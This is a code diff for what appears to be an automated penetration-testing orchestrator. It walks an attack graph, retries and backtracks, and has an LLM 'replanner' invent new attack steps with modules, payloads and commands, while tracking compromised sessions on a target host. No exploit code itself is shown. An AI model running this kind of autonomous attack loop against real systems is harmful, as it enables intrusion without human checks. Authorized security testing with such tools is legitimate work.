+            target_node = graph.nodes[edge.target]
+            failed_edges.append({
+                "target": edge.target,
+                "target_label": target_node.label,
+                "target_goal": target_node.goal,
+                "target_objective": target_node.objective[:200],
+                "failed_checks": failed_checks,
+                "rationale": edge.rationale,
+            })
+
+    # Remaining unreached nodes — include goals and failure info
+    remaining = {}
+    for nid, node in graph.nodes.items():
+        if node.status in (NodeStatus.PENDING.value, NodeStatus.BLOCKED.value):
+            remaining[nid] = {
+                "label": node.label,
+                "goal": node.goal,
+                "agent_type": node.agent_type,
+                "objective": node.objective[:200],
+                "tool_name": node.tool_name,
+            }
+        elif node.status == NodeStatus.FAILED.value:
+            remaining[nid] = {
+                "label": node.label,
+                "goal": node.goal,
+                "status": "FAILED — DO NOT connect to this node, it already failed",
+                "failure_reason": node.metadata.get("last_failure_reason", "unknown"),
+            }
+
+    context = (
+        f"OBJECTIVE: {graph.objective}\n\n"
+        f"TARGET (RHOSTS): {graph.target_ip}\n"
+        f"ATTACKER (LHOST): {graph.attacker_ip}\n\n"
+        f"STUCK AT NODE: {stuck_node_id} ({stuck_node.label})\n"
+        f"FINDINGS: {json.dumps(trimmed_findings, indent=2, default=str)}\n\n"
+        f"FAILED OUTGOING EDGES:\n{json.dumps(failed_edges, indent=2, default=str)}\n\n"
+        f"REMAINING NODES:\n{json.dumps(remaining, indent=2, default=str)}\n"
+    )
+
+    log.debug(f"[Replanner] Context:\n{context[:1000]}...")
+
+    try:
+        response = call_llm(
+            messages=[HumanMessage(content=context)],
+            system_prompt=REPLAN_PROMPT,
+        )
+        result = parse_json_response(response.content)
+    except Exception as e:
+        log.error(f"[Replanner] LLM call failed: {e}")
+        return None
+
+    if not result:
+        log.warning("[Replanner] LLM returned empty/unparseable response.")
+        return None
+
+    action = result.get("action", "")
+    rationale = result.get("rationale", "")
+
+    if action == "new_edge":
+        target_id = result.get("target", "")
+        if target_id not in graph.nodes:
+            log.warning(f"[Replanner] Target node '{target_id}' not found")
+            return None
+
+        # Don't re-route to a node that exhausted its retries
+        target_node = graph.nodes[target_id]
+        if target_node.status == NodeStatus.FAILED.value:
+            log.warning(f"[Replanner] Target '{target_id}' is FAILED (exhausted retries) — refusing to retry it")
+            return None
+
+        graph.connect(
+            stuck_node_id, target_id,
+            evidence=f"Replanner: rerouted from {stuck_node_id}",
+            rationale=rationale,
+            condition="on_success",
+        )
+        log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {target_id} — {rationale}")
+        return target_id
+
+    elif action == "new_node":
+        nid = result.get("id", "")
+        if not nid or nid in graph.nodes:
+            log.warning(f"[Replanner] Invalid new node ID: '{nid}'")
+            return None
+
+        new_node = AttackNode(
+            id=nid,
+            label=result.get("label", nid),
+            goal=result.get("goal", ""),
+            agent_type=result.get("agent_type", "impact"),
+            objective=result.get("objective", ""),
+            target_ip=graph.target_ip,
+            tool_name=result.get("tool_name", "session"),
+            module=result.get("module", ""),
+            module_options=result.get("module_options", {}),
+            module_options_alternatives=result.get("module_options_alternatives", {}),
+            payload=result.get("payload", ""),
+            payload_options=result.get("payload_options", {}),
+            commands_to_run=result.get("commands_to_run", []),
+            command_params=result.get("command_params", {}),
+            command_params_alternatives=result.get("command_params_alternatives", {}),
+            max_retries=3,
+            tags=["replanner_generated"],
+        )
+        graph.add_node(new_node)
+        graph.connect(
+            stuck_node_id, nid,
+            evidence=f"Replanner: new step from {stuck_node_id}",
+            rationale=rationale,
+            condition="on_success",
+        )
+        log.info(f"[Replanner] NEW NODE: {nid} ({new_node.label})")
+        log.info(f"[Replanner] NEW EDGE: {stuck_node_id} → {nid} — {rationale}")
+        return nid
+
+    elif action == "give_up":
+        log.warning(f"[Replanner] Gave up: {result.get('reason', '?')}")
+        return None
+
+    else:
+        log.warning(f"[Replanner] Unknown action: {action}")
+        return None
+
+
+# =============================================================================
+# GRAPH WALKER — backtracking depth-first traversal
+# =============================================================================
+
+def _find_next(graph: AttackGraph, node_id: str, tried: set, log: logging.Logger) -> Optional[str]:
+    """
+    Find the next node to visit from node_id by evaluating outgoing edges.
+
+    Checks each outgoing edge's gate + checks against the node's findings.
+    Skips edges already in the 'tried' set.
+
+    Returns the first target node ID whose edge is satisfied, or None.
+    """
+    for edge in graph.outgoing_edges(node_id):
+        edge_key = f"{edge.source}→{edge.target}"
+        if edge_key in tried:
+            continue
+
+        if graph._edge_satisfied(edge):
+            # Log which checks passed
+            for check in edge.checks:
+                passed = check.evaluate(graph.nodes[node_id].findings)
+                log.info(f"    {'PASS' if passed else 'FAIL'}: {check}")
+            log.info(f"  [{node_id}] → {edge.target} (edge satisfied)")
+            return edge.target
+        else:
+            # Log which checks failed
+            for check in edge.checks:
+                passed = check.evaluate(graph.nodes[node_id].findings)
+                if not passed:
+                    log.info(f"    FAIL: {check}")
+            tried.add(edge_key)
+            log.info(f"  [{node_id}] → {edge.target} (edge FAILED — skipping)")
+
+    return None
+
+
+def _execute_node(
+    node_id: str, graph: AttackGraph, log: logging.Logger,
+    explore: bool, checkpoint_path: str,
+) -> bool:
+    """
+    Execute a single node. Returns True on success, False on failure.
+    Handles retries internally.
+    """
+    node = graph.get_node(node_id)
+
+    while True:
+        node.mark_running()
+        log.info(f"  [{node_id}] STATUS → running")
+
+        try:
+            t_start = time.time()
+            log.info(f"  [{node_id}] Subagent started...")
+            findings = dispatch_node(node, graph, log, explore=explore)
+            elapsed = time.time() - t_start
+            log.info(f"  [{node_id}] Subagent finished in {elapsed:.0f}s")
+
+            success = findings.get("success", False)
+            summary = findings.get("summary", "")
+            log.debug(f"  [{node_id}] findings: {json.dumps(findings, default=str)[:2000]}")
+
+            if success:
+                node.mark_success(findings, summary)
+                log.info(f"  [{node_id}] STATUS → success: {summary}")
+
+                # Track sessions globally
+                if "session_id" in findings and findings.get("session_id"):
+                    session_info = {
+                        "session_id": str(findings["session_id"]),
+                        "type": findings.get("session_type", "unknown"),
+                        "target": node.target_ip or graph.target_ip,
+                        "source_node": node_id,
+                    }
+                    graph.active_sessions.append(session_info)
+                    log.info(f"  [{node_id}] New session tracked: {session_info}")
+
+                _checkpoint(graph, checkpoint_path, log)
+                return True
+
+            else:
+                reason = summary or "No success flag in findings"
+                node.mark_failed(reason)
+                if node.can_retry:
+                    log.warning(f"  [{node_id}] STATUS → retry ({node.retries}/{node.max_retries}): {reason}")
+                    time.sleep(2)
+                    continue  # Retry
+                else:
+                    log.error(f"  [{node_id}] STATUS → failed: {reason}")
+                    return False
+
+        except Exception as e:
+            node.mark_failed(str(e))
+            log.exception(f"  [{node_id}] STATUS → error: {e}")
+            if node.can_retry:
+                time.sleep(2)
+                continue
+            return False
+
 
 def run_graph(
     graph: AttackGraph,
     checkpoint_path: Optional[str] = None,
+    explore: bool = False,
 ) -> AttackGraph:
     """
-    Walk an AttackGraph to completion.
+    Walk an AttackGraph using backtracking depth-first traversal.
 
-    Each iteration:
-      1. Find all ready nodes (pending + all incoming edges satisfied)
-      2. Execute each ready node via dispatch_node()
-      3. Write findings back to the node
-      4. Mark node success/failed
-      5. Update global graph state (sessions, credentials)
-      6. Checkpoint (save to disk)
-      7. Repeat until no ready nodes remain
-
-    Args:
-        graph: The AttackGraph to execute.
-        checkpoint_path: If set, save graph state after each node completes.
-
-    Returns:
-        The same AttackGraph, now populated with findings and statuses.
+    Flow:
+      1. Start at a root node
+      2. Execute it
+      3. On success: evaluate outgoing edges, follow the first that passes
+      4. On stuck (no edges pass):
+         - If explore=True: replanner grows a new edge from here
+         - If explore=False: backtrack to predecessor, try next edge
+      5. On node failure: retry if possible, else backtrack
+      6. Repeat until objective reached or no more options
     """
+    log = _setup_logger(graph.name)
+
     if not checkpoint_path:
         checkpoint_path = f"graphs/{graph.name}_state.json"
 
     graph.status = "running"
     graph.started_at = graph.started_at or _now()
 
-    print_colored(f"\n{'='*70}", Colors.HEADER)
-    print_colored(f"[Orchestrator] Starting graph execution", Colors.HEADER)
-    print_colored(f"  Graph: {graph.name} ({graph.id})", Colors.HEADER)
-    print_colored(f"  Objective: {graph.objective}", Colors.HEADER)
-    print_colored(f"  Target: {graph.target_ip}", Colors.HEADER)
-    print_colored(f"  Nodes: {len(graph.nodes)}", Colors.HEADER)
-    print_colored(f"{'='*70}\n", Colors.HEADER)
+    log.info(f"{'='*70}")
+    log.info(f"[Orchestrator] Starting graph execution (backtracking walker)")
+    log.info(f"  Graph: {graph.name} ({graph.id})")
+    log.info(f"  Objective: {graph.objective}")
+    log.info(f"  Target: {graph.target_ip}  Attacker: {graph.attacker_ip}")
+    log.info(f"  Nodes: {len(graph.nodes)}  Edges: {len(graph.edges)}")
+    log.info(f"  Explore: {explore}")
+    log.info(f"  Checkpoint: {checkpoint_path}")
+    log.info(f"{'='*70}")
 
-    iteration = 0
-    max_iterations = len(graph.nodes) * (MAX_PIPELINE_RETRIES + 1)  # Safety cap
+    # Track which edges we've tried (to avoid re-checking failed ones)
+    tried_edges: set[str] = set()
+    # Path stack for backtracking
+    path: list[str] = []
+    # Replan budget
+    replan_attempts = 0
+    max_replan_attempts = 5
 
-    while iteration < max_iterations:
-        iteration += 1
+    # Find first root node
+    roots = graph.root_nodes()
+    if not roots:
+        log.error("[Orchestrator] No root nodes found in graph!")
+        return graph
+    current = roots[0]
+    log.info(f"[Orchestrator] Starting at root node: {current}")
 
-        ready = graph.ready_nodes()
-        if not ready:
-            if graph.is_complete():
-                print_colored("\n[Orchestrator] All nodes complete.", Colors.OKGREEN)
-            else:
-                # Some nodes are blocked — nothing more we can do
-                _mark_blocked_nodes(graph)
-                print_colored(
-                    "\n[Orchestrator] No ready nodes and graph incomplete — "
-                    "remaining nodes are blocked.",
-                    Colors.WARNING,
-                )
-            break
+    needs_replan = False  # Flag: when True, skip _find_next and go straight to replanner
 
-        print_colored(
-            f"\n[Orchestrator] Iteration {iteration} — ready nodes: {ready}",
-            Colors.HEADER,
-        )
+    while current:
+        node = graph.get_node(current)
 
-        for node_id in ready:
-            node = graph.get_node(node_id)
-            node.mark_running()
-
-            try:
-                findings = dispatch_node(node, graph)
-
-                success = findings.get("success", False)
-                summary = findings.get("summary", "")
-
-                if success:
-                    node.mark_success(findings, summary)
-                    print_colored(
-                        f"  [OK] {node_id}: {summary}",
-                        Colors.OKGREEN,
-                    )
-                    # Track sessions globally
-                    if "session_id" in findings and findings.get("session_id"):
-                        graph.active_sessions.append({
-                            "session_id": str(findings["session_id"]),
-                            "type": findings.get("session_type", "unknown"),
-                            "target": node.target_ip or graph.target_ip,
-                            "source_node": node_id,
-                        })
+        # Skip if already completed (e.g., on backtrack path)
+        if node.status == NodeStatus.SUCCESS.value:
+            # If we backtracked here, go straight to replanner
+            if needs_replan:
+                needs_replan = False
+                if explore and replan_attempts < max_replan_attempts:
+                    replan_attempts += 1
+                    log.info(f"[Orchestrator] Replan attempt {replan_attempts}/{max_replan_attempts} from '{current}'")
+                    new_target = _replan_from(graph, current, log)
+                    if new_target:
+                        _checkpoint(graph, checkpoint_path, log)
+                        path.append(current)
+                        current = new_target
+                        continue
+                # Replanner failed or not in explore mode — backtrack further
+                if path:
+                    current = path.pop()
+                    needs_replan = True
+                    log.info(f"[Orchestrator] Replanner exhausted, backtracking to: {current}")
+                    continue
                 else:
-                    reason = summary or "No success flag in findings"
-                    node.mark_failed(reason)
-                    if node.can_retry:
-                        print_colored(
-                            f"  [RETRY] {node_id}: {reason} "
-                            f"(attempt {node.retries}/{node.max_retries})",
-                            Colors.WARNING,
-                        )
-                    else:
-                        print_colored(
-                            f"  [FAILED] {node_id}: {reason}",
-                            Colors.FAIL,
-                        )
+                    log.info("[Orchestrator] Path exhausted — no more options.")
+                    break
 
-            except Exception as e:
-                node.mark_failed(str(e))
-                print_colored(
-                    f"  [ERROR] {node_id}: {e}",
-                    Colors.FAIL,
-                )
+            # Normal flow — try existing edges first
+            log.info(f"\n[{current}] Already succeeded — finding next edge...")
+            next_node = _find_next(graph, current, tried_edges, log)
+            if next_node:
+                path.append(current)
+                current = next_node
+                continue
+            else:
+                # All existing edges exhausted — try replanner
+                if explore and replan_attempts < max_replan_attempts:
+                    replan_attempts += 1
+                    log.info(f"[Orchestrator] Replan attempt {replan_attempts}/{max_replan_attempts} from '{current}'")
+                    new_target = _replan_from(graph, current, log)
+                    if new_target:
+                        _checkpoint(graph, checkpoint_path, log)
+                        path.append(current)
+                        current = new_target
+                        continue
 
-            # Checkpoint after each node
-            _checkpoint(graph, checkpoint_path)
+                # Backtrack
+                if path:
+                    current = path.pop()
+                    log.info(f"[Orchestrator] Backtracking to: {current}")
+                    continue
+                else:
+                    log.info("[Orchestrator] Path exhausted — no more options.")
+                    break
 
-            # Brief pause between nodes for rate limiting
-            time.sleep(1)
+        # Execute the node
+        log.info(f"\n[Orchestrator] Executing node: {current} ({node.label})")
+        success = _execute_node(current, graph, log, explore, checkpoint_path)
+
+        if success:
+            # Find next node via outgoing edges
+            log.info(f"  [{current}] Evaluating outgoing edges...")
+            next_node = _find_next(graph, current, tried_edges, log)
+
+            if next_node:
+                path.append(current)
+                current = next_node
+                continue
+
+            # No outgoing edges pass — are we at a leaf? That's success (end of chain)
+            if not graph.outgoing_edges(current):
+                log.info(f"  [{current}] Leaf node — chain complete!")
+                break
+
+            # Have outgoing edges but all failed checks — stuck, go to replanner
+            log.warning(f"  [{current}] All outgoing edges failed checks — stuck!")
+
+            if explore and replan_attempts < max_replan_attempts:
+                replan_attempts += 1
+                log.info(f"[Orchestrator] Replan attempt {replan_attempts}/{max_replan_attempts} from '{current}'")
+                new_target = _replan_from(graph, current, log)
+                if new_target:
+                    _checkpoint(graph, checkpoint_path, log)
+                    path.append(current)
+                    current = new_target
+                    continue
+
+            # Can't replan — backtrack with replan flag for predecessor
+            if path:
+                current = path.pop()
+                needs_replan = True
+                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
+                continue
+            else:
+                log.warning("[Orchestrator] No backtrack options — ending.")
+                break
+
+        else:
+            # Node failed — mark the edge that led here as tried, then backtrack
+            # Set needs_replan so the backtrack target goes straight to replanner
+            log.warning(f"  [{current}] Node failed — backtracking with replan flag...")
+            if path:
+                predecessor = path[-1]
+                tried_edges.add(f"{predecessor}→{current}")
+                log.info(f"  Marked edge {predecessor}→{current} as tried")
+                current = path.pop()
+                needs_replan = True
+                log.info(f"[Orchestrator] Backtracking to: {current} (replan=True)")
+                continue
+            else:
+                log.error("[Orchestrator] Node failed with no backtrack options — ending.")
+                break
+
+        time.sleep(1)
+
+    # Mark any remaining pending nodes
+    for node in graph.nodes.values():
+        if node.status == NodeStatus.PENDING.value:
+            node.mark_skipped("Not reached by walker")
 
     # Final status
     graph.status = "completed"
     graph.completed_at = _now()
-    _checkpoint(graph, checkpoint_path)
-
-    # Print summary
-    _print_summary(graph)
+    _checkpoint(graph, checkpoint_path, log)
+    _print_summary(graph, log)
 
     return graph
 
 
-def _mark_blocked_nodes(graph: AttackGraph):
+def _mark_blocked_nodes(graph: AttackGraph, log: logging.Logger = None):
     """Mark any remaining PENDING nodes as BLOCKED."""
+    log = log or logging.getLogger("orchestrator")
     for node in graph.nodes.values():
         if node.status == NodeStatus.PENDING.value:
-            # Check if any predecessor failed
             preds = graph.predecessors(node.id)
             failed_preds = [
                 pid for pid in preds
                 if graph.nodes[pid].status == NodeStatus.FAILED.value
             ]
             if failed_preds:
-                node.mark_blocked(
-                    f"Predecessor(s) failed: {', '.join(failed_preds)}"
-                )
+                reason = f"Predecessor(s) failed: {', '.join(failed_preds)}"
+                node.mark_blocked(reason)
+                log.warning(f"  [{node.id}] STATUS → blocked: {reason}")
 
 
-def _checkpoint(graph: AttackGraph, path: str):
+def _checkpoint(graph: AttackGraph, path: str, log: logging.Logger = None):
     """Save graph state to disk."""
+    log = log or logging.getLogger("orchestrator")
     try:
         graph.save(path)
+        log.debug(f"  Checkpoint saved: {path}")
     except Exception as e:
-        print_colored(f"  [WARNING] Checkpoint save failed: {e}", Colors.WARNING)
+        log.warning(f"  Checkpoint save failed: {e}")
 
 
-def _print_summary(graph: AttackGraph):
+def _print_summary(graph: AttackGraph, log: logging.Logger = None):
     """Print final execution summary."""
-    print_colored(f"\n{'='*70}", Colors.HEADER)
-    print_colored("[Orchestrator] EXECUTION COMPLETE", Colors.HEADER)
-    print_colored(f"  Status: {graph.status}", Colors.HEADER)
-    print_colored(f"  Success rate: {graph.success_rate():.0%}", Colors.HEADER)
-    print()
+    log = log or logging.getLogger("orchestrator")
+    log.info(f"\n{'='*70}")
+    log.info("[Orchestrator] EXECUTION COMPLETE")
+    log.info(f"  Status: {graph.status}")
+    log.info(f"  Success rate: {graph.success_rate():.0%}")
 
     for node in graph.nodes.values():
         icon = {
             "success": "✓", "failed": "✗",
             "skipped": "⊘", "blocked": "⊗",
         }.get(node.status, "?")
-        color = {
-            "success": Colors.OKGREEN, "failed": Colors.FAIL,
-            "skipped": Colors.WARNING, "blocked": Colors.FAIL,
-        }.get(node.status, Colors.ENDC)
-        print_colored(f"  {icon} {node.id}: {node.summary or node.status}", color)
+        log.info(f"  {icon} {node.id}: {node.summary or node.status}")
 
     if graph.active_sessions:
-        print_colored("\n  Active sessions:", Colors.OKCYAN)
+        log.info("\n  Active sessions:")
         for s in graph.active_sessions:
-            print_colored(
+            log.info(
                 f"    Session {s['session_id']} ({s['type']}) → {s['target']} "
-                f"(from {s['source_node']})",
-                Colors.OKCYAN,
+                f"(from {s['source_node']})"
             )
 
-    print_colored(f"{'='*70}\n", Colors.HEADER)
+    log.info(f"{'='*70}\n")
 
 
 def _now() -> str:
-    from datetime import datetime, timezone
     return datetime.now(timezone.utc).isoformat()
 
 
